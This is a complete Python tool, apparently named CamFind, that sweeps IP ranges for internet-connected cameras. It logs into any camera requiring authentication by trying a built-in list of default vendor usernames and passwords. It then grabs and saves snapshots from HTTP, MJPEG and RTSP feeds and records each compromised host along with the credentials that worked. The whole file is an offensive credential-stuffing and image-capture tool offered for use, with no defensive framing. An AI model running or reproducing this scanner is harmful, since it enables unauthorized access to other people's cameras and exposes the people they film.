import requests, os, urllib3, cv2, io, threading, uuid, logging, time, ipaddress, argparse
from requests.exceptions import RequestException, Timeout
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from PIL import Image
from queue import Queue, Empty

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

requests.packages.urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings()

class CamFind:
    def __init__(self, max_threads=None, wait_time=10.0, tries=3):
        self.found_log = "found_cameras.txt"
        self.pics_folder = "camera_screenshots"
        os.makedirs(self.pics_folder, exist_ok=True)
        
        self.cam_queue = Queue() 

        self.max_threads = max_threads or min(32, (os.cpu_count() or 1) * 4)
            
        self.wait_time = wait_time
        self.tries = tries

        self.timeout_thresh = 0.4
        self.timeouts = 0
        self.scans_done = 0
        self.rate_lock = threading.Lock()
        
        self.pool = ThreadPoolExecutor(max_workers=self.max_threads)
        self.sess = requests.Session()
        self.sess.verify = False

        self.creds = [
            None,
            ('admin', 'admin'), ('admin', ''), ('admin', 'password'), ('admin', '12345'),
            ('admin', '123456'), ('admin', '1234'), ('admin', 'admin123'), ('admin', 'pass123'),
            ('admin', '11111'), ('admin', '54321'), ('admin', '111111'), ('admin', '666666'),
            ('admin', '1234567'), ('admin', '12345678'), ('admin', 'abc123'), ('admin', 'pass'),
            ('root', 'root'), ('root', ''), ('root', 'pass'), ('root', 'password'),
            ('root', 'admin'), ('root', '12345'), ('root', '123456'), ('supervisor', 'supervisor'),
            ('admin1', 'admin1'), ('administrator', 'administrator'), ('administrator', 'admin'),
            ('ubnt', 'ubnt'), ('service', 'service'), ('support', 'support'), ('user', 'user'),
            ('guest', 'guest'), ('default', 'default'), ('system', 'system'), ('admin', '9999'),
            ('admin', '123456789'), ('hikvision', 'hikvision'), ('admin', 'hikvision'),
            ('admin', '12345678a'), ('dahua', 'dahua'), ('admin', 'dahua'), ('admin', '888888'),
            ('axis', 'axis'), ('root', 'pass'), ('viewer', 'viewer'), ('admin', 'meinsm'),
            ('admin', '4321'), ('foscam', 'foscam'), ('admin', 'foscam'), ('amcrest', 'amcrest'),
            ('admin', 'amcrest'), ('reolink', 'reolink'), ('admin', 'reolink'), ('lorex', 'lorex'),
            ('admin', 'lorex'), ('swann', 'swann'), ('admin', 'swann'), ('admin', 'tlJwpbo6'),
            ('admin', 'Hikvision2020'), ('admin', 'HikAdmin2020'), ('admin', 'hik12345'),
            ('admin', 'hikadmin'), ('admin', 'dahua2020'), ('admin', 'DahuaAdmin'),
            ('admin', 'dh12345'), ('admin', 'dahuaadmin'), ('admin', 'axis2020'),
            ('admin', 'AxisAdmin'), ('admin', 'ax12345'), ('admin', 'axisadmin'),
        ]

        self.sigs = [
            'ipcamera', 'netcam', 'webcam', 'web camera', 'ip camera', 'network camera',
            'onvif', 'rtsp', 'hikvision', 'dahua', 'axis', 'foscam', 'amcrest', 'reolink',
            'ubiquiti', 'lorex', 'swann', 'hanwha', 'vivotek', 'bosch', 'panasonic',
            'trendnet', 'dlink', 'geovision', 'avigilon', 'mobotix', 'arecont', 'acti',
            'samsung', 'toshiba', 'uniview', 'pelco', 'honeywell', 'flir', 'basler',
            'zavio', 'grandstream', 'milesight', 'provision-isr', 'watchnet', 'digital watchdog',
            'microseven', 'annke', 'zosi', 'zmodo', 'ivideon', 'wyze', 'tapo', 'eufy',
            'arlo', 'nest cam', 'blink', 'ring camera', 'unifi protect', 'yoosee', 'vstarcam',
            'wansview', 'sricam', 'floureon', 'video server', 'network video', 'nvr', 'dvr',
            'ipcam', 'netcam', 'webcamxp', 'webcam 7', 'blue iris', 'surveillance', 'cctv',
        ]

        self.h_check = [
            'server', 'www-authenticate', 'x-camera-id', 'x-powered-by', 'x-frame-options', 'x-content-type-options',
        ]

        self.snap_paths = [
            '/Streaming/channels/1/picture', '/cgi-bin/snapshot.cgi', '/snap.jpg',
            '/snapshot.jpg', '/image.jpg', '/video.cgi', '/image/jpeg.cgi',
            '/mjpg/video.mjpg', '/cgi-bin/video.jpg', '/live.jpg', '/onvif-http/snapshot',
            '/axis-cgi/jpg/image.cgi', '/webcapture.jpg?command=snap', '/media/video1/jpeg',
            '/live/ch0', '/live/stream', '/live/1/jpeg.jpg', '/live_stream', '/image1',
            '/video1', '/cam/realmonitor', '/videostream.cgi', '/img/snapshot.cgi',
            '/cgi-bin/camera.cgi', '/jpeg', '/picture', '/image', '/still', '/capture', '/frame',
        ]
        self.mjpeg_paths = ['/video.mjpg', '/mjpg/video.mjpg', '/videostream.mjpg']


    def is_valid(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def check_cam(self, url, rsp=None):
        try:
            if not rsp:
                try:
                    head_rsp = self.sess.head(url, timeout=self.wait_time)
                    if head_rsp.status_code == 401 or any(sig.lower() in str(head_rsp.headers).lower() for sig in self.sigs):
                        logging.info(f"Probable cam via HEAD at {url}")
                        rsp = self.sess.get(url, timeout=self.wait_time)
                    else:
                        return False
                except (RequestException, Timeout) as e:
                    logging.debug(f"Request error {url}: {e}")
                    return False

            if not rsp:
                return False

            lower_headers = {k.lower(): v.lower() for k, v in rsp.headers.items()}

            if rsp.status_code == 401 and 'www-authenticate' in lower_headers:
                logging.info(f"Cam found at {url} (401)")
                return True

            cont = rsp.text.lower()
            h_str = str(lower_headers)

            for sig in self.sigs:
                if sig.lower() in cont or sig.lower() in h_str:
                    logging.info(f"Cam found at {url} (Sig: '{sig}')")
                    return True

            for h in self.h_check:
                lower_h = h.lower()
                if lower_h in lower_headers:
                    h_val = lower_headers[lower_h]
                    for sig in self.sigs:
                        if sig.lower() in h_val:
                            logging.info(f"Cam found at {url} (Hdr sig: '{lower_h}: {sig}')")
                            return True

            if 'rtsp://' in cont or 'rtmp://' in cont:
                logging.info(f"Cam found at {url} (Stream link)")
                return True

            if any(x in cont for x in ['mjpg', 'mjpeg', 'cgi-bin/video', 'videostream', 'snapshot.cgi']):
                logging.info(f"Cam found at {url} (Video terms)")
                return True

            return False
        except RequestException as e:
            logging.debug(f"Request error in check_cam for {url}: {e}")
        except Exception as e:
            logging.error(f"Error in check_cam for {url}: {e}", exc_info=True)
        return False

    def save_pic(self, img_bytes, url, auth=None):
        try:
            img = Image.open(io.BytesIO(img_bytes))
            if img.size[0] < 32 or img.size[1] < 32:
                logging.debug(f"Image from {url} too small ({img.size[0]}x{img.size[1]})")
                return False

            if img.mode != 'RGB':
                img = img.convert('RGB')

            name_url = url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_').replace('.', '_')
            if len(name_url) > 50:
                name_url = name_url[:50]
            
            auth_str = 'auth' if auth else 'open'
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            f_name = os.path.join(self.pics_folder, f"screenshot_{ts}_{name_url}_{auth_str}_{uuid.uuid4().hex[:8]}.jpg")

            img.save(f_name, 'JPEG', quality=90)
            logging.info(f"Saved image to {f_name} from {url}")
            return True
        except (IOError, OSError) as e:
            logging.warning(f"Failed to open or save image from {url}: {e}")
        except Exception as e:
            logging.error(f"Error processing image from {url}: {e}", exc_info=True)
        return False

    def get_http_pic(self, url, auth=None):
        base_url = url if url.startswith(('http://', 'https://')) else f'http://{url}'

        for path in self.snap_paths:
            img_url = f"{base_url.rstrip('/')}{path}"
            try:
                rsp = self.sess.get(img_url, timeout=self.wait_time, auth=auth, stream=True)
                rsp.raise_for_status()
                
                c_type = rsp.headers.get('Content-Type', '').lower()
                if 'image' in c_type or 'video' in c_type or (rsp.status_code == 200 and len(rsp.content) > 1024):
                    if self.save_pic(rsp.content, img_url, auth):
                        rsp.close()
                        return True
            except RequestException as e:
                logging.debug(f"HTTP image error {img_url}: {e}")
            except Exception as e:
                logging.error(f"Error during HTTP image capture for {img_url}: {e}", exc_info=True)
            finally:
                if 'rsp' in locals() and rsp:
                    rsp.close()

        for path in self.mjpeg_paths:
            mjpeg_url = f"{base_url.rstrip('/')}{path}"
            try:
                rsp = self.sess.get(mjpeg_url, timeout=self.wait_time, auth=auth, stream=True)
                rsp.raise_for_status()

                if 'multipart/x-mixed-replace' in rsp.headers.get('Content-Type', '').lower():
                    b_match = rsp.headers['Content-Type'].split('boundary=')
                    if len(b_match) < 2:
                        logging.warning(f"No boundary in MJPEG stream for {mjpeg_url}")
                        continue
                    boundary = b_match[1].strip().encode('utf-8')
                    
                    c_buf = b''
                    s_time = time.time()
                    max_r_time = 5
                    max_f_size = 5 * 1024 * 1024

                    for chunk in rsp.iter_content(chunk_size=4096):
                        c_buf += chunk
                        if boundary in c_buf:
                            parts = c_buf.split(boundary)
                            for part in parts:
                                if b'\r\n\r\n' in part:
                                    try:
                                        h_end = part.find(b'\r\n\r\n')
                                        if h_end != -1:
                                            f_data = part[h_end + 4:].strip()
                                            if f_data and len(f_data) > 1000:
                                                if self.save_pic(f_data, mjpeg_url, auth):
                                                    rsp.close()
                                                    return True
                                    except Exception as e:
                                        logging.debug(f"MJPEG frame parse error from {mjpeg_url}: {e}")
                            c_buf = parts[-1] if parts else b''
                            if time.time() - s_time > max_r_time:
                                logging.debug(f"MJPEG frame timeout for {mjpeg_url}")
                                break
                        if len(c_buf) > max_f_size:
                            logging.debug(f"MJPEG buffer size exceeded for {mjpeg_url}")
                            break
                        if time.time() - s_time > max_r_time:
                            logging.debug(f"MJPEG stream read timeout for {mjpeg_url}")
                            break
            except RequestException as e:
                logging.debug(f"MJPEG stream request error for {mjpeg_url}: {e}")
            except Exception as e:
                logging.error(f"Error during MJPEG stream capture for {mjpeg_url}: {e}", exc_info=True)
            finally:
                if 'rsp' in locals() and rsp:
                    rsp.close()
        return False

    def get_rtsp_pic(self, url):
        cap = None
        try:
            cap = cv2.VideoCapture(url)
            if not cap.isOpened():
                logging.error(f"Failed to open RTSP stream: {url}")
                return False

            max_tries = 5
            frame = None
            for i in range(max_tries):
                ret, frame = cap.read()
                if ret and frame is not None and frame.size > 0:
                    break
                logging.debug(f"Try {i+1}/{max_tries} failed to read RTSP frame from {url}")
                time.sleep(0.1)

            if frame is not None and frame.size > 0:
                if frame.shape[0] < 32 or frame.shape[1] < 32:
                    logging.warning(f"RTSP frame from {url} too small ({frame.shape[1]}x{frame.shape[0]})")
                    return False

                rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                return self.save_pic(cv2.imencode('.jpg', rgb_frame)[1].tobytes(), url, auth='rtsp')
            else:
                logging.warning(f"Failed to get valid frame from RTSP: {url}")
                return False
        except Exception as e:
            logging.error(f"Error in RTSP capture for {url}: {e}", exc_info=True)
            return False
        finally:
            if cap:
                cap.release()

    def get_cam_pic(self, url, auth=None):
        if url.startswith('rtsp://'):
            return self.get_rtsp_pic(url)
        else:
            return self.get_http_pic(url, auth)

    def log_cam(self, url, reason, auth_creds=None):
        with self.rate_lock:
            if url not in list(self.cam_queue.queue):
                self.cam_queue.put((url, auth_creds))
                logging.info(f"Found cam: {url} ({reason})")
                with open(self.found_log, "a") as f:
                    a_str = f" with {auth_creds[0]}:{auth_creds[1]}" if auth_creds else ""
                    f.write(f"{datetime.now()} - {url}{a_str} - {reason}\n")
            else:
                logging.debug(f"Cam {url} already queued.")

    def try_creds(self, url):
        for creds in self.creds:
            if not creds:
                continue

            try:
                rsp = self.sess.get(url, auth=creds, timeout=self.wait_time)
                rsp.raise_for_status()
                
                if rsp.status_code == 200:
                    logging.info(f"Auth success with {creds[0]}:{creds[1]} for {url}. Getting pic.")
                    if self.check_cam(url, rsp=rsp):
                        self.log_cam(url, f'Auth cam with {creds[0]}:{creds[1]}', auth_creds=creds)
                        return creds
            except RequestException as e:
                logging.debug(f"Auth failed for {url} with {creds[0]}:{creds[1]}: {e}")
            except Exception as e:
                logging.error(f"Error in try_creds for {url} with {creds[0]}:{creds[1]}: {e}", exc_info=True)
        return None

    def adjust_threads(self):
        with self.rate_lock:
            if self.scans_done == 0:
                cur_timeout_rate = 0.0
            else:
                cur_timeout_rate = self.timeouts / self.scans_done

            self.timeouts = 0
            self.scans_done = 0

            old_max = self.max_threads
            if cur_timeout_rate > self.timeout_thresh and self.max_threads > 1:
                self.max_threads = max(1, self.max_threads // 2)
                logging.warning(f"High timeout rate ({cur_timeout_rate:.1%}). Reducing threads {old_max} to {self.max_threads}")
            elif cur_timeout_rate < 0.1 and self.max_threads < 64:
                self.max_threads = min(64, self.max_threads + 4)
                logging.info(f"Low timeout rate ({cur_timeout_rate:.1%}). Increasing threads {old_max} to {self.max_threads}")
            
            if old_max != self.max_threads:
                self.pool.shutdown(wait=False)
                self.pool = ThreadPoolExecutor(max_workers=self.max_threads)
                logging.info(f"Thread pool re-init with {self.max_threads} workers.")


    def scan_one_ip(self, ip):
        if not self.is_valid(ip):
            logging.debug(f"Bad IP: {ip}")
            return False

        url = f'http://{ip}'
        found = False

        for attempt in range(self.tries):
            try:
                if attempt > 0:
                    time.sleep(0.2 * attempt)
                
                rsp = self.sess.get(url, timeout=self.wait_time)
                rsp.raise_for_status()

                if rsp.status_code == 401:
                    logging.info(f"{url} is 401, trying creds.")
                    if self.try_creds(url):
                        found = True
                        break
                
                elif self.check_cam(url, rsp=rsp):
                    self.log_cam(url, 'Open cam')
                    found = True
                    break

            except Timeout:
                with self.rate_lock:
                    self.timeouts += 1
                logging.debug(f"Timeout {url} (Attempt {attempt + 1}/{self.tries})")
            except RequestException as e:
                logging.debug(f"Request error {url} (Attempt {attempt + 1}/{self.tries}): {e}")
            except Exception as e:
                logging.error(f"Error scanning {url} (Attempt {attempt + 1}/{self.tries}): {e}", exc_info=True)
            finally:
                with self.rate_lock:
                    self.scans_done += 1
                if 'rsp' in locals() and rsp:
                    rsp.close()
        
        if self.scans_done % 100 == 0:
            self.adjust_threads()

        return found

    def process_queue(self):
        while True:
            try:
                url, auth_creds = self.cam_queue.get(timeout=1)
                logging.info(f"Processing pic for {url}")
                if auth_creds:
                    self.get_cam_pic(url, auth=auth_creds)
                else:
                    self.get_cam_pic(url)
                self.cam_queue.task_done()
            except Empty:
                logging.debug("Cam queue empty, waiting.")
                time.sleep(5)

    def go(self, targets):
        logging.info(f"Starting cam scan with {self.max_threads} workers.")
        
        proc_thread = threading.Thread(target=self.process_queue, daemon=True)
        proc_thread.start()

        futures = []
        if isinstance(targets, str) and '/' in targets:
            try:
                net = ipaddress.ip_network(targets, strict=False)
                scan_ips = [str(ip) for ip in net.hosts()]
                logging.info(f"Scanning range: {targets} ({len(scan_ips)} hosts)")
            except ValueError:
                logging.error(f"Bad IP range: {targets}.")
                return
        elif isinstance(targets, list):
            scan_ips = targets
            logging.info(f"Scanning {len(scan_ips)} IPs.")
        else:
            logging.error("Bad input for IPs.")
            return

        for ip in scan_ips:
            fut = self.pool.submit(self.scan_one_ip, ip)
            futures.append(fut)

        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception as e:
                logging.error(f"Scan task failed: {e}")

        self.pool.shutdown(wait=True)
        self.cam_queue.join()

        logging.info("Scan and pic process done.")
        logging.info(f"Results in {self.found_log}")
        logging.info(f"Pics in {self.pics_folder}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scan IPs for cameras.")
    parser.add_argument("-t", "--target", type=str, help="IP, CIDR (e.g., 192.168.1.0/24), or comma-list of IPs.")
    parser.add_argument("-w", "--workers", type=int, default=None, help="Worker count.")
    parser.add_argument("-T", "--timeout", type=float, default=10.0, help="Request timeout.")
    parser.add_argument("-R", "--retries", type=int, default=3, help="Request retries.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose log.")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if not args.target:
        print("Need a target.")
        parser.print_help()
    else:
        if ',' in args.target:
            targets_to_scan = [ip.strip() for ip in args.target.split(',')]
        else:
            targets_to_scan = args.target

        scanner = CamFind(max_threads=args.workers, wait_time=args.timeout, tries=args.retries)
        scanner.go(targets_to_scan)
